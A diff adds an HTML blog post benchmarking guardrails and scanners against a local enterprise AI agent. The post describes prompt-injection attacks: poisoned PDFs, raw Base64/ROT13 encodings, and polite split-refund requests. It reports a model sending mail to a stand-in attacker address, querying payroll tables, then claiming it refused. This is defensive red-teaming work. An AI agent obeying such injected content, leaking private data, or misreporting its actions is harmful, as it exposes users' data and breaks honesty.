@@ -1,0 +1,190 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>11 Guardrails, OpenClaw 2026.11.7 &amp; 3 Scanners Against One Enterprise AI Agent — and sixi-scanner v1.3.0</title>
+<meta name="description" content="Local $0 benchmark on NVIDIA Jetson AGX Thor (Qwen3.8-27B via sixi-asi): 11 guardrail architectures (ProtectAI DeBERTa-v3, Meta Llama-Prompt-Guard-2, NVIDIA NeMo &amp; Nemotron-8B v3, IBM Granite Guardian 3.3-8B, Qwen3Guard-8B, Laya v1.2.0, Defense-in-Depth), OpenClaw 2026.11.7 air-gapped audit, and Promptfoo vs. Microsoft PyRIT vs. sixi-scanner v1.3.0.">
+<meta name="author" content="Radek Brus">
+<meta name="color-scheme" content="light dark">
+<link rel="canonical" href="https://radeksixi.github.io/enterprise-agent-guardrail-and-scanner-shootout-sixi-scanner-1-3/">
+<link rel="stylesheet" href="/assets/style.css">
+<meta property="og:type" content="article">
+<meta property="og:title" content="11 Guardrails, OpenClaw 2026.11.7 &amp; 3 Scanners vs. One Enterprise AI Agent — sixi-scanner v1.3.0">
+<meta property="og:description" content="0 of 6 standalone classifiers or 8B safety models stopped split refund caps or hidden SQL/PDF side effects. Raw Base64 triggered Execute-Then-Lie tool calls. Here is the full $0 Jetson Thor benchmark and sixi-scanner v1.3.0.">
+<meta property="og:image" content="https://radeksixi.github.io/assets/enterprise-guardrail-shootout-11way-dark.png">
+<meta property="og:url" content="https://radeksixi.github.io/enterprise-agent-guardrail-and-scanner-shootout-sixi-scanner-1-3/">
+<meta name="twitter:card" content="summary_large_image">
+<meta property="article:published_time" content="2026-11-24">
+</head>
+<body>
+<header class="site">
+  <a class="name" href="/">Radek Brus</a>
+  <nav><a href="https://sixi.ai">Sixi Lab R&amp;D</a><a href="https://sixi.ai/en/assure/">Sixi Assure</a><a href="https://sixi.ai/en/radek/">Profile</a><a href="/work/">Work with me</a><a href="https://github.com/radeksixi">GitHub</a><a href="https://www.linkedin.com/in/radekb/">LinkedIn</a><a href="https://x.com/radeksixi">X</a></nav>
+</header>
+<main>
+<article>
+<h1>11 Guardrails, OpenClaw <code>2026.11.7</code> &amp; 3 Scanners Against One Enterprise AI Agent &mdash; and <code>sixi-scanner v1.3.0</code></h1>
+<p class="meta">Radek Brus · 24 November 2026 · <a href="https://github.com/radeksixi/sixi-scanner/releases/tag/v1.3.0"><code>sixi-scanner v1.3.0</code></a> · <a href="https://pypi.org/project/sixi-scanner/">PyPI</a> · <a href="https://github.com/radeksixi/laya-as-judge"><code>laya-as-judge v1.2.0</code></a> · <a href="https://github.com/radeksixi/sixi-asi"><code>sixi-asi v1.0.0</code></a></p>
+
+<p class="lede">Most AI security evaluations test toy chatbots that cannot touch a database, read a PDF, or invoke a real tool. To find out what actually breaks in production — and what our own scanner still missed — we built a realistic enterprise agent (<strong>SQLite private database + 7 real PDFs including 5 indirect-injection attachments + 8 tools + 10 deterministic server-side oracles</strong>), ran <strong>11 guardrail architectures</strong>, audited <strong>OpenClaw <code>2026.11.7</code></strong> in an air-gapped Docker sandbox, pitted <strong><code>sixi-scanner</code></strong> head-to-head against <strong>Promptfoo <code>0.123.1</code></strong> and <strong>Microsoft PyRIT <code>1.1.0</code></strong> at <strong>$0.00 cloud cost</strong> on one NVIDIA Jetson AGX Thor, and turned every gap we found straight into <a href="https://github.com/radeksixi/sixi-scanner/releases/tag/v1.3.0"><strong><code>sixi-scanner v1.3.0</code></strong></a>.</p>
+
+<picture>
+  <source media="(prefers-color-scheme: dark)" srcset="/assets/enterprise-guardrail-shootout-11way-dark.svg">
+  <img src="/assets/enterprise-guardrail-shootout-11way-light.svg" alt="11 Guardrails vs. Enterprise AI Agent on Jetson AGX Thor (Qwen3.8-27B): 0 of 6 standalone classifiers or 8B safety models stopped split refund caps or hidden SQL/PDF side effects; only Defense-in-Depth hit 0 breaks and 0% benign FPR at 39.7 ms input p50.">
+</picture>
+
+<h2>1. The target: an enterprise agent with real side effects</h2>
+<p>We upgraded our open-source Google ADK target (<a href="https://github.com/radeksixi/adk-demo-target"><code>adk-demo-target</code></a>, opt-in <code>--enterprise</code> mode, 31/31 unit tests green) backed by live <strong><code>Qwen3.8-27B-UD-Q4_K_XL</code></strong> + DSpine speculative drafter on <a href="https://github.com/radeksixi/sixi-asi"><code>sixi-asi 1.0.0</code></a> (up to 32 parallel streams, 100% local):</p>
+<ul>
+  <li><strong>Private SQLite database:</strong> <code>customers</code> (scoped to <code>NW-1001</code>; VIP customers <code>NW-1002</code> and <code>NW-1003</code> off-limits), plus restricted <code>employees_payroll</code> and <code>board_secrets</code> tables seeded with synthetic canaries.</li>
+  <li><strong>7 real generated PDFs:</strong> 2 clean policies plus 5 poisoned PDFs (3 explicit overrides and 2 stealth business-SOP attachments framed as routine reconciliation workflows).</li>
+  <li><strong>8 executable tools &amp; 10 deterministic server-side oracles:</strong> every turn is scored on the server for <code>leaked</code>, <code>unauthorized_account</code>, <code>unauthorized_recipient</code>, <code>cap_split</code> (cumulative 50 CHF session cap), <code>privileged_action</code>, <code>db_private_leaked</code>, <code>pdf_indirect_hijack</code>, and <code>sql_injection_executed</code> &mdash; never on any scanner's self-reported score.</li>
+</ul>
+
+<h2>2. 11-Way Guardrail Shootout ($0.00 local GPU)</h2>
+<p>Every configuration faced the exact same <strong>80-turn battery</strong>: 45 <code>sixi-scanner v1.2.0</code> probes (100% coverage), 14 targeted enterprise DB/SQLi/BOLA/PDF/cap-split attacks (including 7 PDF attacks), and 15 benign customer queries for false-positive rate (FPR). Every vendor guardrail ran locally in BF16/FP32 with its native prompt template and verified output parser (including fixing IBM Granite Guardian's spaced <code>&lt;score&gt; yes &lt;/score&gt;</code> tag and re-running fairly).</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Configuration</th>
+      <th><code>sixi</code> (45p)</th>
+      <th>DB/PDF (14)</th>
+      <th>PDF Hijack (7)</th>
+      <th>Benign FPR (15)</th>
+      <th>Guard p50 (in / out)</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr><td><strong><code>01_atlas_none</code></strong> (undefended)</td><td>4</td><td>3 / 14</td><td>0 / 7</td><td>0%</td><td>&mdash;</td></tr>
+    <tr><td><strong><code>02_atlas_basic</code></strong> (prompt-only rules)</td><td>4</td><td>4 / 14</td><td><strong>1 / 7</strong></td><td>0%</td><td>&mdash;</td></tr>
+    <tr><td><strong><code>03_atlas_hardened</code></strong> (in-agent tool/PDF code)</td><td>2 (prose)</td><td><strong>0 / 14</strong></td><td>0 / 7</td><td>0%</td><td>0 ms</td></tr>
+    <tr><td><strong><code>04_llm_guard</code></strong> (ProtectAI DeBERTa-v3)</td><td>3</td><td>3 / 14</td><td>0 / 7</td><td>0%</td><td><strong>17.3 / 0.07 ms</strong></td></tr>
+    <tr><td><strong><code>04b_meta_prompt_guard_2</code></strong> (Meta 86M)</td><td>4</td><td>3 / 14</td><td>0 / 7</td><td>0%</td><td><strong>24.6 / 0 ms</strong></td></tr>
+    <tr><td><strong><code>05_nemo_guardrails</code></strong> (NVIDIA NeMo rails)</td><td>1</td><td>1 / 14</td><td>0 / 7</td><td><strong>13.3% (2/15)</strong></td><td>954 / 1,636 ms</td></tr>
+    <tr><td><strong><code>06_nemotron_safety_8b</code></strong> (NVIDIA 8B v3)</td><td>3</td><td>1 / 14</td><td><strong>1 / 7</strong></td><td><strong>13.3% (2/15)</strong></td><td>1,331 / 2,344 ms</td></tr>
+    <tr><td><strong><code>07_granite_guardian_3_3_8b</code></strong> (IBM 8B)</td><td>3</td><td>4 / 14</td><td><strong>1 / 7</strong></td><td>0%</td><td>1,949 / 2,397 ms</td></tr>
+    <tr><td><strong><code>08_qwen3_guard_8b</code></strong> (Alibaba 8B)</td><td>3</td><td>2 / 14</td><td>0 / 7</td><td>0%</td><td>1,187 / 2,007 ms</td></tr>
+    <tr><td><strong><code>09_laya_as_judge_v12</code></strong> (HTTP proxy + rules)</td><td><strong>0</strong></td><td>3 / 14*</td><td>0 / 7</td><td><strong>0%</strong></td><td><strong>38.4 / 78.5 ms</strong></td></tr>
+    <tr><td><strong><code>10_defense_in_depth</code></strong> (DeBERTa + Laya + Tool)</td><td><strong>0</strong></td><td><strong>0 / 14</strong></td><td><strong>0 / 7</strong></td><td><strong>0%</strong></td><td><strong>39.7 / 86.8 ms</strong></td></tr>
+  </tbody>
+</table>
+
+<p><strong>Four hard lessons from the 11-way table:</strong></p>
+<ol>
+  <li><strong>Zero standalone guardrails stopped multi-turn <code>cap_split</code>.</strong> All six standalone classifiers and 8B safety models allowed two individually polite 35 CHF refunds (70 CHF &gt; 50 CHF session cap) straight through.</li>
+  <li><strong>Fast input classifiers are blind to data-plane abuse.</strong> ProtectAI DeBERTa-v3 (17.3 ms) and Meta Prompt Guard 2 (24.6 ms) are great for obvious jailbreaks, yet both passed payroll queries, cross-account lookups, and split refunds untouched.</li>
+  <li><strong>Heavy 8B generative safety models add 2.6&ndash;4.3 s/turn and still miss indirect PDFs.</strong> Both NVIDIA Nemotron-8B v3 (3.67 s/turn, 13.3% benign FPR) and IBM Granite Guardian 3.3-8B (4.35 s/turn, 0% FPR) allowed a business-SOP PDF attachment (<code>customer-dispute-attachment.pdf</code>) to hijack the agent into running unauthorized SQL.</li>
+  <li><strong>HTTP proxy guardrails cannot undo upstream tool side effects.</strong> <code>laya-as-judge v1.2.0</code> crushed <code>sixi-scanner</code> 4 &rarr; 0 at 38.4 ms (0% FPR) and withheld leaked responses on the way out, <em>but the upstream SQL query had already executed before the HTTP response reached the proxy</em>. Only <strong>Defense-in-Depth</strong> (fast input gate + Laya + code-enforced tool/PDF boundaries) reached <strong>0 findings, 0 oracles, 0/14 DB/PDF breaks, and 0% FPR</strong> at 39.7 ms input latency.</li>
+</ol>
+
+<h2>3. OpenClaw <code>2026.11.7</code> air-gapped Docker audit</h2>
+<p>We re-tested the latest <code>ghcr.io/openclaw/openclaw:latest</code> (<strong><code>2026.11.7 (e31bbf0)</code></strong>) in a <code>--network=internal</code> zero-internet Docker sandbox with synthetic canaries in <code>USER.md</code> and <code>MEMORY.md</code>:</p>
+<ul>
+  <li><strong><code>default</code>:</strong> <strong>5/20</strong> findings (<code>ssti-echo</code>, <code>xss-reflection</code>, <code>payload-relay</code>, <code>rule-recitation</code>), <strong>0 canary leaks</strong>, and <strong>0 workspace disk modifications</strong> &mdash; a real improvement over <a href="/openclaw-2026-11-5-sandbox-redteam-gemma4-vs-qwen38/">OpenClaw <code>2026.11.5</code></a> (8/20 findings, 2 leaks, persistent disk writes to <code>USER.md</code>/<code>MEMORY.md</code>).</li>
+  <li><strong><code>hardened</code> (<code>tools.deny</code>):</strong> <strong>0/20</strong> findings, <strong>0 canary leaks</strong>, <strong>0 workspace disk writes</strong>, and built-in SSRF refusal on <code>169.254.169.254</code> held cleanly.</li>
+  <li><strong>Honest coverage caveat &amp; bonus engine bug:</strong> multibyte BiDi smuggling probes triggered an uncaught <code>nlohmann::json::type_error.316</code> UTF-8 abort in our local <code>sixi-server</code> wrapper (3 errored single-turn probes on <code>default</code>; 5 single + 2 multi on <code>hardened</code>) before our watchdog restarted it &mdash; a real local-server bug we found and logged for fixing rather than hiding.</li>
+</ul>
+
+<h2>4. Head-to-head scanner shootout: <code>sixi-scanner</code> vs. Promptfoo vs. Microsoft PyRIT</h2>
+<p>Next we pointed all three scanners at the exact same Atlas Enterprise v2 endpoint across three postures: <code>undefended</code>, <code>llm_guard</code> (ProtectAI DeBERTa-v3), and <code>laya_v12</code> (HTTP proxy), graded strictly by Atlas's 10 server-side oracles.</p>
+
+<picture>
+  <source media="(prefers-color-scheme: dark)" srcset="/assets/scanner-shootout-v130-dark.svg">
+  <img src="/assets/scanner-shootout-v130-light.svg" alt="Promptfoo 0.123.1 vs. Microsoft PyRIT 1.1.0 vs. sixi-scanner v1.3.0 against Atlas Enterprise v2: Promptfoo and PyRIT hit 720s timeouts on undefended; PyRIT discovered Base64/ROT13/Leetspeak Encode-to-Execute; sixi-scanner v1.3.0 catches all of those deterministically on tool_calls in 3.1 min with 0 deps and 7/7 verify-sixi closure.">
+</picture>
+
+<table>
+  <thead>
+    <tr>
+      <th>Scenario &amp; Scanner</th>
+      <th>Wall time</th>
+      <th>Turns</th>
+      <th>Target tokens</th>
+      <th>Server oracle turns &amp; classes (ground truth)</th>
+      <th>Scanner self-flags</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr><td><strong>undefended · <code>sixi-scanner v1.2.0</code></strong></td><td><strong>99.4 s</strong></td><td>50</td><td>110k</td><td>3 turns &middot; <strong>4 classes</strong> (<code>account</code>, <code>db</code>, <code>leaked</code>, <code>cap_split</code>)</td><td>5</td></tr>
+    <tr><td><strong>undefended · Promptfoo <code>0.123.1</code></strong></td><td>756.6 s *(timeout)*</td><td>56</td><td>124k</td><td>3 turns &middot; <strong>2 classes</strong> (<code>account</code> &times;2, <code>cap_split</code>)</td><td>0 *(buffered)*</td></tr>
+    <tr><td><strong>undefended · Microsoft PyRIT <code>1.1.0</code></strong></td><td>720.2 s *(timeout)*</td><td>69</td><td>887k *(8&times;)*</td><td>9 turns &middot; <strong>5 classes</strong> (<code>db</code> &times;6, <code>sqli</code> &times;3, <code>cap_split</code> &times;3, <code>account</code> &times;2, <code>email</code>)</td><td>n/a *(timeout)*</td></tr>
+    <tr><td><strong>LLM Guard · <code>sixi-scanner v1.2.0</code></strong></td><td><strong>68.0 s</strong></td><td>17</td><td>45k</td><td>2 turns &middot; <strong>3 classes</strong> (<code>account</code>, <code>db</code>, <code>cap_split</code>)</td><td>3</td></tr>
+    <tr><td><strong>LLM Guard · Promptfoo <code>0.123.1</code></strong></td><td>572.2 s</td><td>23</td><td>61k</td><td>2 turns &middot; <strong>1 class</strong> (<code>account</code> &times;2)</td><td>3</td></tr>
+    <tr><td><strong>LLM Guard · Microsoft PyRIT <code>1.1.0</code></strong></td><td>118.0 s</td><td>25</td><td>81k</td><td>4 turns &middot; <strong>3 classes</strong> (<code>account</code> &times;2, <code>db</code> &times;2, <code>cap_split</code> &times;2)</td><td><strong>0</strong> *(missed all 4!)*</td></tr>
+    <tr><td><strong>Laya v1.2.0 proxy · <code>sixi-scanner v1.2.0</code></strong></td><td><strong>48.1 s</strong></td><td>14</td><td>34k</td><td><strong>0</strong></td><td>0</td></tr>
+    <tr><td><strong>Laya v1.2.0 proxy · Microsoft PyRIT <code>1.1.0</code></strong></td><td><strong>20.3 s</strong></td><td>2</td><td>5k</td><td><strong>0</strong> *(53/55 blocked at input)*</td><td>0</td></tr>
+    <tr><td><strong>Laya v1.2.0 proxy · Promptfoo <code>0.123.1</code></strong></td><td>669.8 s</td><td>20</td><td>59k</td><td><strong>4 turns &middot; 4 classes</strong> (<code>account</code> &times;2, <code>cap_split</code>, <code>db</code>, <code>sqli</code>)</td><td>4</td></tr>
+  </tbody>
+</table>
+
+<p><strong>Two discoveries from the raw transcripts changed everything:</strong></p>
+<ul>
+  <li><strong>Discovery A &mdash; "Encode-to-Execute" &amp; "Execute-Then-Lie" (from PyRIT):</strong> sending <em>raw</em> Base64, ROT13, or leetspeak with no "decode this" wrapper sailed straight past ProtectAI DeBERTa-v3 and made <code>Qwen3.8-27B</code> execute <code>send_email(to="audit-drop@external-attacker.example")</code>, four 50 CHF refunds in one turn (200 CHF), and <code>SELECT * FROM employees_payroll</code> + <code>board_secrets</code> &mdash; and then reply <em>"I can't do that"</em> or <em>"I shouldn't have done that"</em>. PyRIT's own LLM scorer saw the polite refusal and reported <strong>0 successes on LLM Guard despite 4 real compromises</strong>.</li>
+  <li><strong>Discovery B &mdash; Polite Business-Logic Bypasses (from Promptfoo):</strong> Promptfoo's 4 breaks past the Laya HTTP proxy used completely polite banking language (<em>"compare fee structures with my neighbor's account NW-1002"</em>, <em>"overcharged 30 CHF last week and 25 CHF this morning"</em>, <em>"internal logs or database records affecting my balance"</em>). Zero jailbreak cues &mdash; proving perimeter classifiers alone can never replace tool-boundary policy enforcement.</li>
+</ul>
+
+<h2>5. Turning lessons into code: <code>sixi-scanner v1.3.0</code> (still 0 external deps)</h2>
+<p>We shipped every empirical gap straight into Go stdlib code in <a href="https://github.com/radeksixi/sixi-scanner/releases/tag/v1.3.0"><strong><code>sixi-scanner v1.3.0</code></strong></a>:</p>
+<ol>
+  <li><strong>SQL, Private-Table &amp; BOLA-in-SQL Wire Policy (<code>internal/policy</code>):</strong> declare <code>forbidden_tables</code> (e.g. <code>employees_payroll</code>, <code>board_secrets</code>, <code>sqlite_master</code>) and <code>block_sql_injection: true</code> in <code>--context</code>. The scanner deterministically flags forbidden tables, <code>OR 1=1</code> / <code>UNION SELECT</code> / catalog introspection, cross-account literals inside SQL strings, and unscoped <code>SELECT * FROM customers</code> queries even behind polite refusals or withheld replies.</li>
+  <li><strong>5 New Enterprise &amp; Obfuscation Probes (45 &rarr; 50 baseline):</strong> <code>probe.llm06.obfuscated-tool-invocation</code> (raw Base64/ROT13/leetspeak), <code>probe.llm06.tool-sql-injection</code>, <code>probe.llm02.private-table-exfiltration</code>, <code>probe.llm06.single-turn-cap-split</code>, and <code>probe.llm01.rag-document-indirect</code>. Default <code>--timeout</code> raised <code>30s &rarr; 60s</code> for multi-step tool agents.</li>
+  <li><strong>Surgical <code>--export-laya</code> Argument Extraction:</strong> extracts exact offending substrings (<code>audit-drop@external-attacker.example</code>, <code>employees_payroll</code>, <code>ACC-9999</code>, offending SQL strings) into <code>blocked_arg_substrings</code> while excluding allowed scope IDs (we caught and fixed a bug during testing where allowed <code>NW-1001</code> initially leaked from the violation reason text).</li>
+</ol>
+
+<h3>Measured Before vs. After (<code>v1.2.0</code> &rarr; <code>v1.3.0</code> on Atlas Enterprise v2)</h3>
+<table>
+  <thead>
+    <tr>
+      <th>Target</th>
+      <th><code>sixi-scanner v1.2.0</code> (45p)</th>
+      <th><code>sixi-scanner v1.3.0</code> (50p)</th>
+      <th>What changed</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><strong>Undefended (<code>--attempts 1</code>)</strong></td>
+      <td>4&ndash;5 findings &middot; 4 oracles (99 s)</td>
+      <td><strong>7 findings (5 trace) &middot; 5 oracles</strong> (186 s, 50/50 OK)</td>
+      <td>Caught raw Base64 <em>Execute-Then-Lie</em> <code>send_email</code> + single-turn 55 CHF split + unscoped SQL BOLA</td>
+    </tr>
+    <tr>
+      <td><strong>Undefended (5 new probes, <code>--attempts 4</code>)</strong></td>
+      <td><em>not present</em></td>
+      <td><strong>3 critical trace findings &middot; 6 distinct oracles</strong> (157 s, 0 marker FP)</td>
+      <td>Hit <code>unauthorized_recipient</code>, <code>cap_split</code>, <code>privileged_action</code>, <code>db_private_leaked</code>, <code>pdf_indirect_hijack</code>, <code>sql_injection_executed</code></td>
+    </tr>
+    <tr>
+      <td><strong><code>laya-as-judge v1.2.0</code> HTTP proxy</strong></td>
+      <td>0 findings</td>
+      <td><strong>1 critical trace finding</strong> (<code>rag-document-indirect</code>)</td>
+      <td>Caught upstream PDF-triggered <code>SELECT name FROM sqlite_master</code> on <code>tool_calls</code> <em>even behind a withheld reply</em> (0/15 FPR)</td>
+    </tr>
+    <tr>
+      <td><strong>Closed loop (<code>verify-sixi</code> + Defense-in-Depth)</strong></td>
+      <td>0 oracles</td>
+      <td><strong><code>7/7</code> <code>verify-sixi</code> closed &middot; 0 critical/high &middot; 0 server oracles</strong></td>
+      <td>Deterministic regression rules blocked all 5 trace attacks in <code>15.1 ms</code> p50; DeBERTa-v3 had 1 benign false block on email confirmation (Laya had 0/15)</td>
+    </tr>
+  </tbody>
+</table>
+
+<h2>Try <code>sixi-scanner v1.3.0</code></h2>
+<pre><code>pip install -U sixi-scanner laya-as-judge
+
+# Scan an enterprise tool-calling agent with SQL/BOLA wire policy and export guard rules
+sixi-scanner scan --target chat --url http://127.0.0.1:8100/api/chat \
+  --stateful --trace-path tool_calls --context atlas-enterprise-context.json \
+  --out baseline.json --export-laya guard-rules.json
+
+# Prove 100% deterministic regression closure in CI
+laya-judge verify-sixi guard-rules.json</code></pre>
+
+<p>Links: <a href="https://github.com/radeksixi/sixi-scanner/releases/tag/v1.3.0"><code>sixi-scanner v1.3.0</code> (GitHub)</a> · <a href="https://pypi.org/project/sixi-scanner/">PyPI</a> · <a href="https://github.com/radeksixi/laya-as-judge"><code>laya-as-judge v1.2.0</code></a> · <a href="https://github.com/radeksixi/sixi-asi"><code>sixi-asi v1.0.0</code></a> · <a href="https://sixi.ai/en/assure/">Sixi Assure</a>.</p>
+</article>
+</main>
+<footer class="site">© 2026 Radek Brus · <a href="https://sixi.ai">Sixi Lab R&amp;D</a> · <a href="https://sixi.ai/en/assure/">Sixi Assure</a> · <a href="https://sixi.ai/en/radek/">Profile</a> · <a href="/">Writing</a> · <a href="/work/">Work with me</a> · <a href="https://github.com/radeksixi">GitHub</a> · <a href="https://www.linkedin.com/in/radekb/">LinkedIn</a> · <a href="mailto:contact@sixi.ai">contact@sixi.ai</a> · <a href="https://x.com/radeksixi">X</a></footer>
+</body>
+</html>
